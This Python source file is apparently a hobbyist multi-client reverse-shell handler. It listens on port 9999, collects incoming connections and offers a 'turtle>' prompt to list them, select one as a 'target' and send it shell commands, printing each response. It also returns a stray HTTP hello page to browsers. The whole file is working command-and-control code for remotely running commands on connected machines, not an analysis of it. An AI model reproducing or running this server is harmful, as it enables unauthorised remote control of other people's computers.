import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2] # 1.listen and accept threads & 2.send command to the devices
queue = Queue()
all_connections, all_address = [], []

# for the multi-threading the everything is same until bind and listen
# the differnce is comes from the socket_connection() 

# socket-creation [connect multiple devices]
def create_socket():
    try:
        global host # also know as IP addr
        global port
        global s # socket
        host=""
        port=9999
        s = socket.socket()

    except socket.error as msg:
        print(f'socket connection: {msg}')

server_ready = threading.Event()

# binding the socket and listening for connections
def bind_sockets():
    
    try:
        global host
        global port
        global s 

        print(f"Binding the port {str(port)}")

        s.bind((host, port))
        s.listen(5)
        server_ready.set()

    except socket.error as msg:
        print(f'socket connection: {msg} /n Retrying')
        bind_sockets()

# handling connection from multiple connections and saving to list
# closing previous connection when server,py file is restarted

# 1. Thread listen and accept the connection
def accepting_the_connections():
    for c in all_connections:
        c.close() # closing each connections one-by-one is the server is restarted

    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept() 
            '''Conn-> stores command, addr-> IP + port'''
            conn.setblocking(1) # timeout the connections - prevent timeout
            
            # appending stuffs
            all_connections.append(conn) 
            all_address.append(addr)
            msg_from_browser = conn.recv(4096)
            print(msg_from_browser)
            if msg_from_browser is not None:
                conn.send(str.encode('''HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Hello from my TCP server</h1>'''))
            '''h = input('''''')
            conn.send(h)'''

            print(f"connection established {addr[0]}")

        except Exception as e:
            print(f"Error accepting connections {e}")

# 2. Thread see all the client, select the client and send command to the client
# interactive prompt for sending command
# turtle> list
# 1. FRI-A
# 2. FRI-B
# 3. FRI-C

#turtle> select 1 -> the id of the person
# 192.234.50.6>
# terminal == shell -> named as cmd

def start_turtle():
    server_ready.set()
    while True:
        cmd = input("turtle>")
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None: 
                send_target_command(conn)

        else:
            print("command not recoganize")

# Displaying all current active connections for the client
def list_connections():
    result = ''

    for i,conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)

        except:
            del all_connections[i]
            del all_address[i]
            continue

        result += str(i) + '    ' + str(all_address[i][0]) +  '    ' + str(all_address[i][1]) + '\n'

    print('-----clients-----' + '\n' + result)

#selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') 
        target = int(target)
        conn = all_connections[target]
        print(f"you can connected to the :{str(all_address[target][0])}")
        print(str(all_address[target][0]) + ">", end="")
        return conn
    except:
        print("selection is not valid")
        return None
    
# send the command to the client
def send_target_command(conn):
    while True:
        try:
            cmd = input() 
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))  # encodding as byte format
                client_response = str(conn.recv(1024),"utf-8") # decoding the client repsonse
                print(client_response, end="")
        except:
            print("Error in sending command")
            break

#create worker thread
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon=True 
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_sockets()
            accepting_the_connections()
        if x ==2:
            start_turtle()

        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_workers()
create_jobs()

